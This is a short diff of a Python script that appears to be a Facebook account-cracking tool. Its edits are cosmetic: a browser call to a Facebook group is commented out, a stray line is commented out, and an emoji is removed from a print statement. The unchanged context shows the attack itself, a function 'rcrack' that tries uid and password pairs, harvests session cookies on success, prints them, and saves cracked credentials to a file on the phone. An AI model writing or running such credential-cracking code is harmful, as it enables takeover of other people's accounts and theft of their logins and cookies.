@@ -59,7 +59,7 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-os.system('xdg-open https://facebook.com/groups/554714119911648/')
+#os.system('xdg-open https://facebook.com/groups/554714119911648/')
 logo =("""\033[0;92m
 
  __          _        __  _____  ___ 
@@ -137,7 +137,7 @@ for xd in range(10000):
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
     
- APK CHECK
+ #APK CHECK
 def xxr():
     user=[]
     twf =[]
@@ -241,7 +241,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[Shanto-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[Shanto-OK] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/Shanto-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
